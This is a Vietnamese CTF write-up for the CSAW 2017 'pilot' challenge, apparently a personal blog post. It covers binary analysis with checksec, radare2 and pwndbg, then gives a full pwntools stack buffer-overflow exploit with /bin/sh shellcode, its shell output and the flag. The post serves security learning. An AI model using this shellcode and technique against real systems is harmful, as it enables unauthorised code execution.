---
title: "[CSAW CTF 17] pwn75: pilot"
date: 2017-09-20T23:48:01-04:00
Tags: ["ctf", "reverse engineering", "exploit development", "pwn", "csaw-ctf-17"]
Categories: ["CTF"]
---

![header](/img/csaw-ctf-qualification-2017/scoreboard.png)

Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não ([quangltm](https://pwneris.me) và anh [tuanit96](http://www.hardtobelieve.me/)), mình đã quẩy được vài bài khá cơ bản.

Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:

```r
➜  pilot git:(master) ✗ file pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
```

Như vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì sẽ rất thốn, nhưng lát nữa mình sẽ giới thiệu 1 tool cực hay mà mình tìm thấy để giúp việc debug stripped binaries đỡ thốn hơn 10000 lần.

Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO

```r
➜  pilot checksec pilot 
[*] '/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Chạy chương trình ra output như sau:

```r
➜  pilot git:(master) ✗ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fff0ef02250
[*]Command:
```
Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào...

```r
➜  pilot git:(master) ✗ r2 -A pilot                           
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x004008b0]> afl
0x004007c8    3 26           sub.__gmon_start___248_7c8
0x00400800    2 16   -> 32   sym.imp.setvbuf
0x00400810    2 16   -> 48   sub._ZNSt8ios_base4InitC1Ev_32_810
0x00400820    2 16   -> 48   sym.imp.read
0x00400830    2 16   -> 48   sym.imp.__libc_start_main
0x00400840    2 16   -> 48   sym.imp.__cxa_atexit
0x00400850    2 16   -> 48   sub._ZNSt8ios_base4InitD1Ev_64_850
0x00400860    2 16   -> 48   sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860
0x00400870    2 16   -> 48   sub._ZNSolsEPKv_80_870
0x00400880    2 16   -> 48   sub._ZNSolsEPFRSoS_E_88_880
0x00400890    2 16   -> 48   sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890
0x004008a0    1 16           sub.__gmon_start___248_8a0
0x004008b0    1 41           entry0
0x004008e0    4 50   -> 41   fcn.004008e0
0x004009a6    4 400          main
0x00400b36    4 62           sub.std::ios_base::Init.Init___b36
[0x004008b0]> 
```

Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: [syms2elf](https://github.com/danigargu/syms2elf). Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh `$syms2elf pilot_unstripped`. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.

Đặt breakpoint tại vị trí gọi hàm read trong main ở `0x00400ae0`:

```r
pwndbg> r
Starting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped 
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffe0a0
[*]Command:
Breakpoint 1, 0x0000000000400ae0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────]
*RAX  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
 RBX  0x0
*RCX  0x7f1788dd3720 (__write_nocancel+7) ◂— cmp    rax, -0xfff
*RDX  0x40
 RDI  0x0
*RSI  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
*R8   0x7f1789091700 (proc_file_chain_lock) ◂— 0
*R9   0x7f1789090600 (_IO_2_1_stdout_) ◂— xchg   dword ptr [rax], ebp /* 0xfbad2887 */
*R10  0x60d
*R11  0x246
*R12  0x4008b0 (entry0) ◂— xor    ebp, ebp
*R13  0x7fffffffe1a0 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x7fffffffe0c0 —▸ 0x400b90 ◂— push   r15
*RSP  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
*RIP  0x400ae0 (main+314) ◂— call   0x400820
[────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────]
 ► 0x400ae0 <main+314>    call   read@plt                      <0x400820>
        fd: 0x0
        buf: 0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
        nbytes: 0x40
```

Như vậy ta thấy ngay địa chỉ của buffer khi đọc vào đã được in ra. Vậy thì exploit quá đơn giản rồi, chỉ cần đặt shellcode lên buffẻr và ghi đè return address bằng địa chỉ buffer thôi:

```python
from pwn import *

context.arch = 'amd64'

s = remote('pwn.chal.csaw.io', 8464)

raw_input('Exploit?')
shellcode = "\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05"

s.recvuntil('[*]Location:')
leak_buffer = s.recvuntil('\n').strip()
print leak_buffer
leak_buffer = int(leak_buffer, 16)
s.recvuntil('[*]Command:')

print 'Shellcode is at:', hex(leak_buffer)

payload = ''
payload += shellcode
payload += '\x90' * (40 - len(shellcode))
payload += p64(leak_buffer)
s.sendline(payload)
s.interactive()
s.close()
```

```r
➜  pilot git:(master) ✗ python exploit.py 
[+] Opening connection to pwn.chal.csaw.io on port 8464: Done
Exploit?
0x7ffe3cf25d80
Shellcode is at: 0x7ffe3cf25d80
[*] Switching to interactive mode
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ whoami
pilot
$ cat flag
flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
$  
```